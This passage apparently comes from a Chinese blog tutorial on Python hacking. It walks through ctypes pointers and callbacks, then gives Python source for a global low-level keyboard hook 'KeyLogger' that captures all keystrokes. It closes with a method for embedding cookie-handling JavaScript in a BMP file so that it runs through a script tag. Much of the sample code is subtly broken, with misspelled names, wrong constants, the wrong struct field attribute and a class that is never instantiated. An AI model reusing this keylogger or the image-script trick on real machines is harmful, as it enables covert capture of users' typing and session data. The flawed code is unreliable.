title="6.指针和引用"></a>6.指针和引用</h3><ul><li>ctypes中用POINTER和pointer表示指针，使用POINTER时需要设置指向的数据类型，而pointer则直接从变量中得到一个特定类型的指针</li><li>ctypes还可以用byref()函数直接从变量得到指针指向的数据类型，用于传递参数引用。通常使用byref()的地方同样也可用指针函数pointer()，但pointer()通常会额外创建一个指针对象，使用byref()会更快</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>type_p_int<span class="token operator">=</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建指向整数的指针类型</span>v<span class="token operator">=</span>c_int<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义一个整数，值为4</span>p_int<span class="token operator">=</span>type_p_int<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#给指针变量(p_int)赋值（为变量v的地址）</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#指针引用值使用[0]</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">.</span>contents<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#指针实例的contents属性，返回指针所指向的对象，输出c_long(4)</span>v<span class="token operator">=</span>c_int<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义一个整数，值为4</span>p_int<span class="token operator">=</span>pointer<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#直接得到v的指针，不需创建指针类型（省去类型声明）</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出4</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">.</span>contents<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出c_long(4)</span></code></pre><ul><li>对指针类型c_char_p，c_wchar_p，c_void_p的赋值将会改变其指向的内存区域地址，而不是改变内存块的值（因为Python字符串是只读的）</li><li>如果需要一个可写的内存块，使用函数create_string_buffer()创建</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>create_string_buffer<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建3字节长的buf，且初始化为0</span><span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出3'\x00\x00\x00'</span>p<span class="token operator">=</span>create_string_buffer<span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出10'Hello\x00\x00\x00\x00\x00'</span>p<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token string">"Hi"</span>    <span class="token comment" spellcheck="true">#修改buf内容（这是可写的buf）</span><span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出10'Hi\x00lo\x00\x00\x00\x00\x00'</span>pw<span class="token operator">=</span>create_unicode_buffer<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建一个unicode的buf，初始化为0</span>printf<span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>pw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出6</span></code></pre><h3 id="7-类型转换"><a href="#7-类型转换" class="headerlink" title="7.类型转换"></a>7.类型转换</h3><ul><li>ctypes会做严格的类型检查</li><li>但也可以传递兼容类型，如数组类型代替指针类型</li><li>如果函数参数声明为某种指针类型（例如POINT(c_int)类型），则传递该指针指向的对象类型也是可以的（例如这里可以传递c_int），ctypes会自动加上byref()函数进行类型转换</li><li>ctypes也提供了一个转换函数cast()，可以使用类似于C语言强制类型转换的方式进行类型转换</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">BX</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"count"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>b<span class="token operator">=</span>BX<span class="token punctuation">(</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span>count<span class="token operator">=</span><span class="token number">3</span>b<span class="token punctuation">.</span>values<span class="token operator">=</span><span class="token punctuation">(</span>c_int<span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#数组和指针的转化</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>b<span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>values<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出1 2 3</span>b<span class="token punctuation">.</span>values<span class="token operator">=</span>None    <span class="token comment" spellcheck="true">#设置指针为NULL</span>b<span class="token punctuation">.</span>values<span class="token operator">=</span><span class="token punctuation">(</span>c_byte<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#报错，类型不对。需要int*或int数组。这里是byte数组</span>b<span class="token punctuation">.</span>values<span class="token operator">=</span>cast<span class="token punctuation">(</span><span class="token punctuation">(</span>c_byte<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#正确，强制把byte数组转化为int</span></code></pre><h3 id="8-回调函数"><a href="#8-回调函数" class="headerlink" title="8.回调函数"></a>8.回调函数</h3><ul><li>ctypes允许在python中创建C回调函数指针，称为回调函数</li><li>需要为回调函数创建一个类，该类知道调用协议，函数返回值类型，函数接受的参数个数及类型。ctypes通过工厂函数CFUNCTYPE()支持回调函数</li><li>CFUNCTYPE函数使用普通cdecl调用约定来为回调函数创建类型。在Windows平台，WINFUNCTYPE函数使用stdcall调用约定来为回调函数创建类型</li><li>调用这两个函数时，第一个参数为回调函数的返回值，剩下的参数为回调函数的参数<br>例：C标准库中的快排qsort()是一个借助回调函数进行排序的函数，C原型及其正常调用形式：</li></ul><pre class=" language-C++"><code class="language-C++">void qsort( void *base,    //数组的起始地址            size_t nmemb,    //数组的元素个数            size_t size,    //每个元素的大小（字节数）            int (*compar)(const void *,const void *)    //比较函数的函数指针);    //qsort函数原型int compare(const void *a, const void *){    return (*(int*)a-*(int*)b);}int values[]={40,10,100,90,20,25};qsort(values,6,sizeof(int),compare);    //C中正常调用</code></pre><p>Python借助ctypes回调函数进行qsort排序</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>libc<span class="token operator">=</span>cldd<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#(Microsoft Visual C Runtime Library)</span>CMPFUNC<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span> POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span> POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义回调函数类型</span><span class="token keyword">def</span> <span class="token function">py_cmp_func</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#实现回调函数功能，python代码实现</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"py_cmp_func"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>cmp_func<span class="token operator">=</span>CMPFUNC<span class="token punctuation">(</span>py_cmp_func<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#回调函数对象</span>IntArray5<span class="token operator">=</span>c_int<span class="token operator">*</span><span class="token number">5</span>ia<span class="token operator">=</span>IntArray5<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span>qsort<span class="token operator">=</span>libc<span class="token punctuation">.</span>qsort    <span class="token comment" spellcheck="true">#排序函数地址</span>qsort<span class="token punctuation">.</span>restype<span class="token operator">=</span>None    <span class="token comment" spellcheck="true">#排序函数返回值</span>qsort<span class="token punctuation">(</span>ia<span class="token punctuation">,</span>len<span class="token punctuation">(</span>ia<span class="token punctuation">)</span><span class="token punctuation">,</span>sizeof<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span>cmp_func<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用排序函数，传入一个回调函数对象</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ia<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre><h3 id="9-windows类型"><a href="#9-windows类型" class="headerlink" title="9.windows类型"></a>9.windows类型</h3><ul><li>Windows API函数不使用标准C的调用约定<ul><li>LoadLibrary时不能够使用cdll.LoadLibrary而使用windll.LoadLibrary</li><li>在声明回调函数指针类型的时候，不能用CFUNCTYPE而是用WINFUNCTYPE</li></ul></li><li>Windows API有很多内建类型，ctypes内部都已经定义好了，导入子模块wintypes后，可以直接使用</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> wintypes    <span class="token comment" spellcheck="true">#HWND等类型已定义好了，可直接使用</span>WNDENUMPROC<span class="token operator">=</span>WINFUNCTYPE<span class="token punctuation">(</span>wintypes<span class="token punctuation">.</span>BOOL<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#定义回调函数类型</span>                        wintypes<span class="token punctuation">.</span>HWND<span class="token punctuation">,</span>                        wintypes<span class="token punctuation">.</span>LPARAM<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">EnumWindowsProc</span><span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#实现回调函数功能</span>    length<span class="token operator">=</span>user32<span class="token punctuation">.</span>GetWindowTextLengthW<span class="token punctuation">(</span>hwnd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>    buffer<span class="token operator">=</span>create_unicode_buffer<span class="token punctuation">(</span>length<span class="token punctuation">)</span>    user32<span class="token punctuation">.</span>GetWindowTextW<span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span>length<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#将指定窗口的标题条文本拷贝到一个缓冲区</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>buffer<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span>user32<span class="token operator">=</span>windll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'user32.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#加载dll</span>user32<span class="token punctuation">.</span>EnumWindows<span class="token punctuation">(</span>WNDENUMPROC<span class="token punctuation">(</span>EnumWindowsProc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#枚举所有屏幕上的顶层窗口，将窗口句柄传送给应用程序定义的回调函数</span></code></pre><h2 id="五、键盘钩子"><a href="#五、键盘钩子" class="headerlink" title="五、键盘钩子"></a>五、键盘钩子</h2><ul><li>使用user32.dll提供的SetWindowsHookEx()函数，可以设置钩子。有消息到来或发生鼠标点击、键盘输入事件时，操作系统提供了中间拦截机制，这称为“钩子”。从功能上实现这种机制的函数称为钩子过程（回调函数）</li><li>操作系统支持为一个钩子类型（鼠标点击、键盘输入等）设置多个钩子过程，并通过钩链管理链表</li><li>每一个Hook都有一个与之相关联的指针列表，称之为钩子链表，由系统来维护。这个列表的指针指向指定的，应用程序定义的，被Hook子程调用的回调函数，也就是该钩子的各个处理子程</li><li>最后安装的钩子放在链的开始，而最早安装的钩子放在最后，也就是后加入的先获得控制权</li><li>钩子分为本地钩子（LocalHook）与全局钩子（GlobalHook）两种。本地钩子 是针对特定线程设置的，全局钩子针对操作系统中运行的所有线程设置<ul><li>钩子类型为键盘输入时，通过为键盘输入设置全局钩子可以对用户的所有键盘输入进行监视。若设置的是本地钩子，则只有相应线程管理的窗口激活后，键盘输入才会触发对钩子过程的调用</li></ul></li></ul><h3 id="1-键盘钩子机制"><a href="#1-键盘钩子机制" class="headerlink" title="1.键盘钩子机制"></a>1.键盘钩子机制</h3><ul><li>1.设置钩子：通过user32.dll的SetWindowsHookEx()函数可以设置钩子，注册用于处理消息的钩子过程（回调函数）</li><li>2.注册钩链：注册后的钩子过程由钩链管理，钩链的最前面注册有钩子过程的指针。接下来，等待键盘输入类型的消息进入相关线程对队列</li><li>3.键盘输入：用户使用键盘向计算机输入想要的消息。键盘控制器将用户输入转换为计算机可识别的信号，并传递给键盘驱动程序</li><li>4.系统队列：来自键盘的消息进入操作系统管理的系统队列，等待进入负责处理消息的线程队列</li><li>5.线程队列：消息进入处理线程的队列后，不会被发送到相应窗口，而是发送给钩链中第一个指针所指的钩子过程</li><li>6.消息钩取：来自线程队列的消息被传递给钩链中第一个指针（实际是指针所指的钩子过程）</li><li>7.钩子过程：钩子过程接收消息，执行程序员指定的动作。大部分黑客攻击代码都位于钩子过程。处理结束后，将消息传递给钩链的下一个指针，也称为回调函数</li><li>8.钩链指针：消息被依次传递给钩链中指针所指的钩子过程。最后一个钩子过程处理完消息后，将消息传递给原先指定的窗口</li><li>设置好钩子后，即可对队列持续进行监视，这会加重系统负担。完成指定任务后，一定要拆除钩子，尽量减少对系统性能的影响<br><img src="https://www.hualigs.cn/image/60534b2953b5e.jpg" alt=""></li></ul><h3 id="2-SetWindowsHookEx函数"><a href="#2-SetWindowsHookEx函数" class="headerlink" title="2.SetWindowsHookEx函数"></a>2.SetWindowsHookEx函数</h3><pre class=" language-C++"><code class="language-C++">HHOOK WINAPI SetWindowsHookEx(    __in int idHook,    //钩子类型，选择对何种类型的消息进行钩取    __in HOOKPROC lpfn,    //回调函数地址    __in HINSTANCE hMod,    //应用程序实例的句柄    __in DWORD dwThreadId    //线程ID，若为0，钩子与所有线程关联，即为全局钩子);    //函数执行成功，则返回值就是该钩子过程的句柄；若此函数执行失败，则返回值为NULL(0)//例：SetWindowsHookEx(WH_KEYBOARD,KeyBoardProc,HInstance,0);</code></pre><h3 id="3-利用ctypes的调用结构"><a href="#3-利用ctypes的调用结构" class="headerlink" title="3.利用ctypes的调用结构"></a>3.利用ctypes的调用结构</h3><pre class=" language-python"><code class="language-python">CMPFUNC<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>pointer<span class="token operator">=</span>CMPFUNC<span class="token punctuation">(</span>hook_Procedure<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#hook_Procedure由用户定义</span>windll<span class="token punctuation">.</span>user32<span class="token punctuation">.</span>SetWindowsHookEx<span class="token punctuation">(</span>    <span class="token number">13</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#WH_KEYBOARD_LL</span>    pointer<span class="token punctuation">,</span>    windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>GetModuleHandle<span class="token punctuation">(</span>None<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">)</span></code></pre><h3 id="4-钩子子程"><a href="#4-钩子子程" class="headerlink" title="4.钩子子程"></a>4.钩子子程</h3><ul><li>应用程序定义的回调函数（CALLBACK Function），定义为普通的C函数。用以监视系统或某一特定类型的事件</li></ul><pre class=" language-C++"><code class="language-C++">LRESULT CALLBACK HookProc(    int nCode,    //Hook代码    WPARAM wParam,    //消息参数    LPARAM lParam);</code></pre><ul><li>使用API函数SetWindowsHookEx()把一个应用程序定义的钩子子程安装到钩子链表中</li><li>处理完消息后，调用API函数CallNextHookEx来继续传递该消息</li><li>钩子在使用完之后需要用UnhookWindowsHookEx()卸载</li></ul><p>例：设置全局钩子，将用户的所有键盘输入显示到控制台。若计算机中没有安装键盘安全程序，则会看到键盘输入的所有内容都在控制台中显示</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes<span class="token punctuation">.</span>wintypes <span class="token keyword">import</span> MSG<span class="token keyword">from</span> ctypes<span class="token punctuation">.</span>wintypes <span class="token keyword">import</span> DWORD<span class="token triple-quoted-string string">'''使用windll：声明user32与kernel32类型的变量。使用相应DLL提供的函数时，格式为unicode'''</span>user32<span class="token operator">=</span>windll<span class="token punctuation">.</span>user32kernel32<span class="token operator">=</span>windll<span class="token punctuation">.</span>kernel32WH_KEYBOARD_LL<span class="token operator">=</span><span class="token number">13</span>    <span class="token comment" spellcheck="true">#变量声明：在Win32 API内部定义并使用的变量值</span>WH_KEYDOWN<span class="token operator">=</span><span class="token number">0x0100</span>CTRL_CODE<span class="token operator">=</span><span class="token number">162</span><span class="token keyword">class</span> <span class="token class-name">KeyLogger</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义类：定义拥有挂钩与拆钩功能的类</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>lUser32<span class="token operator">=</span>user32        self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>None    <span class="token triple-quoted-string string">'''    定义挂钩函数：使用user32.DLL的SetWindowsHookExA()函数设置钩子,要监视的事件为WH_KEYBOARD_LL，范围设置为操作系统中运    '''</span>    <span class="token keyword">def</span> <span class="token function">installHookProc</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>pointer<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>self<span class="token punctuation">.</span>lUser32<span class="token punctuation">.</span>SetWindowsHookExA<span class="token punctuation">(</span>WH_KEYBOARD_LL<span class="token punctuation">,</span>pointer<span class="token punctuation">,</span>kernel32<span class="token punctuation">.</span>GetModuleHandleW<span class="token punctuation">(</span>None<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>hooked<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token triple-quoted-string string">'''    定义拆钩函数：调用user32.DLL中的UnhookwindowsHookEx()函数，拆除之前设置的钩子    '''</span>    <span class="token keyword">def</span> <span class="token function">unInstallHookProc</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>hooked <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">return</span>        self<span class="token punctuation">.</span>lUser32<span class="token punctuation">.</span>UnhookwindowsHookEx<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hooked<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>None<span class="token triple-quoted-string string">'''获取函数指针：若想注册钩子过程（回调函数），必须穿入函数指针'''</span><span class="token keyword">def</span> <span class="token function">getFPTR</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">:</span>    CMPFUN<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> CMPFUNC<span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''定义钩子过程'''</span><span class="token keyword">def</span> <span class="token function">hookProc</span><span class="token punctuation">(</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> wParam <span class="token keyword">is</span> <span class="token operator">not</span> WM_KEYDOWN<span class="token punctuation">:</span>        <span class="token keyword">return</span> user32<span class="token punctuation">.</span>CallNextHookEx<span class="token punctuation">(</span>keylogger<span class="token punctuation">.</span>hooked<span class="token punctuation">,</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span>    hookedkey<span class="token operator">=</span>chr<span class="token punctuation">(</span>lParam<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hookedkey<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>CTRL_CODE<span class="token operator">==</span>int<span class="token punctuation">(</span>lParam<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Crl pressed, call unistallHook()"</span><span class="token punctuation">)</span>        KeyLogger<span class="token punctuation">.</span>unistallHookProc<span class="token punctuation">(</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> user32<span class="token punctuation">.</span>CallNextHookEx<span class="token punctuation">(</span>KeyLogger<span class="token punctuation">.</span>hooked<span class="token punctuation">,</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''传递消息：GetMessageA()函数监视队列'''</span><span class="token keyword">def</span> <span class="token function">startKeyLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg<span class="token operator">=</span>MSG<span class="token punctuation">(</span><span class="token punctuation">)</span>    user32<span class="token punctuation">.</span>GetMessageA<span class="token punctuation">(</span>byref<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#启动消息钩取</span>keyLogger<span class="token operator">=</span>KeyLogger    <span class="token comment" spellcheck="true">#start of hook process</span>pointer<span class="token operator">=</span>getFPTR<span class="token punctuation">(</span>hookProc<span class="token punctuation">)</span><span class="token keyword">if</span> keyLogger<span class="token punctuation">.</span>installHookProc<span class="token punctuation">(</span>pointer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"installed keyLogger"</span><span class="token punctuation">)</span>startKeyLog<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="六、图片文件攻击"><a href="#六、图片文件攻击" class="headerlink" title="六、图片文件攻击"></a>六、图片文件攻击</h2><ul><li><p>向图片（BMP）文件中插入JavaScript脚本，实现对Cookie的读写操作</p></li><li><p>创建hello.bmp，用WinHex打开图片文件，可看到前2字节是“魔数”，用于标识位图文件。0x42、0x4D分别对应字母B和M的ASCII码。随后的4字节整数用于指示BMP文件的大小，单位为字节</p></li><li><p>图片文件攻击机制<br><img src="https://www.hualigs.cn/image/60534b2952afa.jpg" alt=""></p></li><li><p>浏览器可以生成并保存Cookie。Cookie是保存在PC中供浏览器使用的短小信息。浏览器将Cookie保存到自身内存空间或保存为文件，保存用户登录信息与会话信息时。如果黑客窃取了Cookie，就可以将其用于多种攻击</p></li><li><p>Cookie以名称=值对的形式保存。示例中，将name=’id’与value=’Jack’保存到Cookie，示例中设置有效期为7天，最后添加脚本，将Cookie内容显示到警告窗口</p></li><li><p>要插入位图文件的脚本hello.js</p></li></ul><pre class=" language-python"><code class="language-python">name<span class="token operator">=</span><span class="token string">'id'</span><span class="token punctuation">;</span>value<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">;</span>var todayDate<span class="token operator">=</span>new Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>todayDate<span class="token punctuation">.</span>setHours<span class="token punctuation">(</span>todayDate<span class="token punctuation">.</span>getDate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie<span class="token operator">=</span>name<span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span>escape<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">";path=/;expires="</span> <span class="token operator">+</span>todayDate<span class="token punctuation">.</span>toGMTString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>向位图文件插入脚本的Python程序</li><li>向位图文件插入了脚本，位图文件大小有所增加，肉眼查看图片质量无明显变化。若使用WinHex之类的编辑器打开位图文件，可以看到图片文件所做的修改</li><li>编写简单的HTML文件，嵌入显示已含有脚本的位图文件</li></ul><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"hello.bmp"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>显示图像<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"hello.bmp"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>运行脚本<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></code></pre><p>3/18/2021 9:04:09 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统基础</title>
      <link href="2021/03/16/ji-suan-ji-xi-tong-ji-chu/"/>
      <url>2021/03/16/ji-suan-ji-xi-tong-ji-chu/</url>
      
